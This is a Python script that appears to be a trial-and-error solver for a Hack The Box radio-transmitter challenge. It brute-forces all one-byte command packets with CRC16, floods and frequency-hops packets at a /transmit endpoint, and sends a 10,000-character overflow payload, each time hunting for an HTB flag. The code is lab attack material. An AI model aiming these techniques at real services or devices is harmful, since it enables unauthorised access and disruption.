#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 51: Intentar con TODOS los paquetes posibles de 1 byte
print("[*] INNOVACIÓN 51: Todos los comandos de 1 byte con CRC")
s = requests.Session()
s.get(base_url)

for byte_val in range(256):
    data = bytes([byte_val])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print("[*] Enviados 256 comandos de 1 byte")
time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")

# INNOVACIÓN 52: Enviar con timeout muy corto entre paquetes (flooding)
print("\n[*] INNOVACIÓN 52: Flooding rápido")
s = requests.Session()
s.get(base_url)

for _ in range(10):
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print("[*] Enviados 70 paquetes rápidamente")
time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 53: Enviar paquetes en diferentes frecuencias simultáneamente
print("\n[*] INNOVACIÓN 53: Múltiples frecuencias")
s = requests.Session()
s.get(base_url)

freqs = ['433.00', '433.50', '433.92', '434.00', '434.50']
for freq in freqs:
    for addr, cmd in [(0xE1, 0xFF), (0xA1, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': freq, 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 54: Intentar con payload muy largo (buffer overflow?)
print("\n[*] INNOVACIÓN 54: Payload muy largo")
s = requests.Session()
s.get(base_url)

long_payload = 'A' * 10000
r = s.post(f'{base_url}/transmit', data={
    'freq': '433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': long_payload
})

if 'HTB{' in r.text or 'error' in r.text.lower() or 'exception' in r.text.lower():
    print("[+] Respuesta interesante:")
    print(r.text[:500])

# INNOVACIÓN 55: Revisar código fuente JavaScript en detalle
print("\n[*] INNOVACIÓN 55: Analizar JS en la página")
r = s.get(base_url)
# Buscar funciones JavaScript relevantes
js_functions = re.findall(r'function\s+(\w+)\s*\([^)]*\)', r.text)
print(f"[*] Funciones JS encontradas: {js_functions}")

# Buscar URLs en el JS
urls = re.findall(r'url:\s*[\'"]([^\'"]+)[\'"]', r.text)
print(f"[*] URLs en JS: {urls}")

print("\n[*] Innovaciones 51-55 completadas")
